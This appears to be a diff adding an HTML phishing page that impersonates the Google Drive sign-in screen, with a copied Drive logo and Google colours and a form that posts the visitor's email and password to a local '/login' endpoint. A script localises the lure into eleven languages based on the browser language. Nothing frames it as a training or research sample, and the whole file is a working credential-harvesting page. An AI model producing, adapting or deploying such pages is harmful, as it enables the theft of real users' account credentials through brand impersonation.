@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign in - Google Drive</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Google Sans','Segoe UI',Roboto,Helvetica,Arial,sans-serif;
+background:#f8f9fa;display:flex;justify-content:center;align-items:center;
+min-height:100vh;padding:16px}
+.card{background:#fff;border-radius:8px;padding:48px 40px 36px;width:100%;
+max-width:450px;box-shadow:0 1px 3px rgba(0,0,0,.08),0 1px 2px rgba(0,0,0,.06);
+border:1px solid #dadce0}
+.glogo{text-align:center;margin-bottom:8px;font-size:1.75em;font-weight:500;
+letter-spacing:-0.5px}
+.glogo .g1{color:#4285f4}.glogo .o1{color:#ea4335}.glogo .o2{color:#fbbc05}
+.glogo .g2{color:#4285f4}.glogo .l{color:#34a853}.glogo .e{color:#ea4335}
+.drive-icon{text-align:center;margin-bottom:16px}
+.drive-icon svg{width:40px;height:40px}
+h1{text-align:center;font-size:1.25em;font-weight:400;color:#202124;
+margin-bottom:4px}
+p.sub{text-align:center;font-size:.87em;color:#5f6368;margin-bottom:28px}
+.field{position:relative;margin-bottom:24px}
+.field input{width:100%;padding:13px 14px;border:1px solid #dadce0;
+border-radius:4px;font-size:.95em;outline:none;color:#202124;
+background:transparent;transition:border .2s}
+.field input:focus{border:2px solid #1a73e8;padding:12px 13px}
+.field label{position:absolute;top:-9px;left:10px;background:#fff;
+padding:0 4px;font-size:.75em;color:#5f6368;pointer-events:none}
+.field input:focus+label{color:#1a73e8}
+.forgot-link{display:inline-block;margin-bottom:24px;color:#1a73e8;
+text-decoration:none;font-size:.83em;font-weight:500}
+.forgot-link:hover{text-decoration:underline}
+.actions{display:flex;justify-content:space-between;align-items:center;
+margin-top:8px}
+.create{color:#1a73e8;text-decoration:none;font-size:.83em;font-weight:500}
+.create:hover{text-decoration:underline}
+button{padding:10px 24px;background:#1a73e8;color:#fff;border:none;
+border-radius:4px;font-size:.9em;font-weight:500;cursor:pointer;
+transition:background .2s,box-shadow .2s}
+button:hover{background:#1765cc;box-shadow:0 1px 3px rgba(26,115,232,.4)}
+.info{text-align:center;margin-top:24px;font-size:.76em;color:#5f6368;
+line-height:1.5}
+@media(max-width:480px){
+.card{padding:32px 24px 28px;border:none;box-shadow:none;border-radius:0}
+body{background:#fff;padding:0}
+}
+</style>
+</head>
+<body>
+<div class="card">
+<div class="glogo">
+<span class="g1">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span class="l">l</span><span class="e">e</span>
+</div>
+<div class="drive-icon">
+<svg viewBox="0 0 87.3 78" xmlns="http://www.w3.org/2000/svg">
+<path d="M6.6 66.85L1.1 56.05 28.9 6.5h11L6.6 66.85z" fill="#0066da"/>
+<path d="M27.4 78L14 56.05 41.8 6.5h13.4L27.4 78z" fill="#00ac47"/>
+<path d="M73.7 78H27.4l13.4-21.95h46.3L73.7 78z" fill="#ea4335"/>
+<path d="M86.2 56.05H40.8l13.4-21.95 18.7 0L86.2 56.05z" fill="#00832d"/>
+<path d="M54.2 34.1L41.8 6.5h13.4l18.7 32.5-6.3 10.3L54.2 34.1z" fill="#2684fc"/>
+<path d="M27.4 78l13.4-21.95L27.4 34.1 14 56.05 27.4 78z" fill="#ffba00"/>
+</svg>
+</div>
+<h1 data-i18n="title">Sign in to access your files</h1>
+<p class="sub" data-i18n="subtitle">Continue to Google Drive</p>
+<form method="POST" action="/login" autocomplete="off">
+<div class="field">
+<input type="text" id="email" name="username" required autocomplete="off"
+ placeholder=" ">
+<label for="email" data-i18n="email_label">Email</label>
+</div>
+<div class="field">
+<input type="password" id="pass" name="password" required placeholder=" ">
+<label for="pass" data-i18n="pass_label">Password</label>
+</div>
+<a href="#" class="forgot-link" data-i18n="forgot">Forgot password?</a>
+<div class="actions">
+<a href="#" class="create" data-i18n="create">Create account</a>
+<button type="submit" data-i18n="signin">Sign in</button>
+</div>
+</form>
+<div class="info" data-i18n="info">One account. All of Google, working for you.</div>
+</div>
+<script>
+(function(){
+var T={
+en:{title:"Sign in to access your files",subtitle:"Continue to Google Drive",email_label:"Email",pass_label:"Password",forgot:"Forgot password?",create:"Create account",signin:"Sign in",info:"One account. All of Google, working for you."},
+pt:{title:"Fazer login para acessar seus arquivos",subtitle:"Continuar no Google Drive",email_label:"E-mail",pass_label:"Senha",forgot:"Esqueceu a senha?",create:"Criar conta",signin:"Entrar",info:"Uma conta. Todo o Google, trabalhando para voc\u00ea."},
+es:{title:"Inicia sesi\u00f3n para acceder a tus archivos",subtitle:"Continuar a Google Drive",email_label:"Correo electr\u00f3nico",pass_label:"Contrase\u00f1a",forgot:"\u00bfOlvidaste la contrase\u00f1a?",create:"Crear cuenta",signin:"Iniciar sesi\u00f3n",info:"Una cuenta. Todo Google, a tu servicio."},
+fr:{title:"Connectez-vous pour acc\u00e9der \u00e0 vos fichiers",subtitle:"Continuer vers Google Drive",email_label:"Adresse e-mail",pass_label:"Mot de passe",forgot:"Mot de passe oubli\u00e9 ?",create:"Cr\u00e9er un compte",signin:"Se connecter",info:"Un seul compte. Tout Google."},
+de:{title:"Anmelden, um auf Ihre Dateien zuzugreifen",subtitle:"Weiter zu Google Drive",email_label:"E-Mail-Adresse",pass_label:"Passwort",forgot:"Passwort vergessen?",create:"Konto erstellen",signin:"Anmelden",info:"Ein Konto. Alles von Google."},
+it:{title:"Accedi per accedere ai tuoi file",subtitle:"Continua su Google Drive",email_label:"Email",pass_label:"Password",forgot:"Password dimenticata?",create:"Crea un account",signin:"Accedi",info:"Un unico account. Tutto Google al tuo servizio."},
+ja:{title:"\u30d5\u30a1\u30a4\u30eb\u306b\u30a2\u30af\u30bb\u30b9\u3059\u308b\u306b\u306f\u30ed\u30b0\u30a4\u30f3\u3057\u3066\u304f\u3060\u3055\u3044",subtitle:"Google \u30c9\u30e9\u30a4\u30d6\u306b\u7d9a\u884c",email_label:"\u30e1\u30fc\u30eb\u30a2\u30c9\u30ec\u30b9",pass_label:"\u30d1\u30b9\u30ef\u30fc\u30c9",forgot:"\u30d1\u30b9\u30ef\u30fc\u30c9\u3092\u304a\u5fd8\u308c\u306e\u5834\u5408",create:"\u30a2\u30ab\u30a6\u30f3\u30c8\u3092\u4f5c\u6210",signin:"\u30ed\u30b0\u30a4\u30f3",info:"1 \u3064\u306e\u30a2\u30ab\u30a6\u30f3\u30c8\u3067 Google \u306e\u3059\u3079\u3066\u3092\u3002"},
+zh:{title:"\u767b\u5f55\u4ee5\u8bbf\u95ee\u60a8\u7684\u6587\u4ef6",subtitle:"\u7ee7\u7eed\u524d\u5f80 Google \u4e91\u7aef\u786c\u76d8",email_label:"\u7535\u5b50\u90ae\u4ef6",pass_label:"\u5bc6\u7801",forgot:"\u5fd8\u8bb0\u5bc6\u7801\uff1f",create:"\u521b\u5efa\u8d26\u53f7",signin:"\u767b\u5f55",info:"\u4e00\u4e2a\u8d26\u53f7\uff0c\u7545\u4eab Google\u3002"},
+ko:{title:"\ud30c\uc77c\uc5d0 \uc561\uc138\uc2a4\ud558\ub824\uba74 \ub85c\uadf8\uc778\ud558\uc138\uc694",subtitle:"Google \ub4dc\ub77c\uc774\ube0c\ub85c \uacc4\uc18d",email_label:"\uc774\uba54\uc77c",pass_label:"\ube44\ubc00\ubc88\ud638",forgot:"\ube44\ubc00\ubc88\ud638\ub97c \uc78a\uc73c\uc168\ub098\uc694?",create:"\uacc4\uc815 \ub9cc\ub4e4\uae30",signin:"\ub85c\uadf8\uc778",info:"\ud558\ub098\uc758 \uacc4\uc815\uc73c\ub85c \ubaa8\ub4e0 Google \uc11c\ube44\uc2a4\ub97c."},
+ru:{title:"\u0412\u043e\u0439\u0434\u0438\u0442\u0435, \u0447\u0442\u043e\u0431\u044b \u043f\u043e\u043b\u0443\u0447\u0438\u0442\u044c \u0434\u043e\u0441\u0442\u0443\u043f \u043a \u0444\u0430\u0439\u043b\u0430\u043c",subtitle:"\u041f\u0435\u0440\u0435\u0439\u0442\u0438 \u043d\u0430 Google \u0414\u0438\u0441\u043a",email_label:"\u042d\u043b\u0435\u043a\u0442\u0440\u043e\u043d\u043d\u0430\u044f \u043f\u043e\u0447\u0442\u0430",pass_label:"\u041f\u0430\u0440\u043e\u043b\u044c",forgot:"\u0417\u0430\u0431\u044b\u043b\u0438 \u043f\u0430\u0440\u043e\u043b\u044c?",create:"\u0421\u043e\u0437\u0434\u0430\u0442\u044c \u0430\u043a\u043a\u0430\u0443\u043d\u0442",signin:"\u0412\u043e\u0439\u0442\u0438",info:"\u041e\u0434\u0438\u043d \u0430\u043a\u043a\u0430\u0443\u043d\u0442. \u0412\u0441\u0435 \u0441\u0435\u0440\u0432\u0438\u0441\u044b Google."},
+ar:{title:"\u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u062f\u062e\u0648\u0644 \u0644\u0644\u0648\u0635\u0648\u0644 \u0625\u0644\u0649 \u0645\u0644\u0641\u0627\u062a\u0643",subtitle:"\u0627\u0644\u0645\u062a\u0627\u0628\u0639\u0629 \u0625\u0644\u0649 Google Drive",email_label:"\u0627\u0644\u0628\u0631\u064a\u062f \u0627\u0644\u0625\u0644\u0643\u062a\u0631\u0648\u0646\u064a",pass_label:"\u0643\u0644\u0645\u0629 \u0627\u0644\u0633\u0631",forgot:"\u0647\u0644 \u0646\u0633\u064a\u062a \u0643\u0644\u0645\u0629 \u0627\u0644\u0633\u0631\u061f",create:"\u0625\u0646\u0634\u0627\u0621 \u062d\u0633\u0627\u0628",signin:"\u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u062f\u062e\u0648\u0644",info:"\u062d\u0633\u0627\u0628 \u0648\u0627\u062d\u062f. \u0643\u0644 \u062e\u062f\u0645\u0627\u062a Google."}
+};
+var l=(navigator.language||navigator.userLanguage||'en').split('-')[0];
+var t=T[l]||T['en'];
+document.querySelectorAll('[data-i18n]').forEach(function(e){var k=e.getAttribute('data-i18n');if(t[k])e.textContent=t[k]});
+document.querySelectorAll('[data-i18n-ph]').forEach(function(e){var k=e.getAttribute('data-i18n-ph');if(t[k])e.placeholder=t[k]});
+if(l==='ar'){document.documentElement.dir='rtl'}
+})();
+</script>
+</body>
+</html>
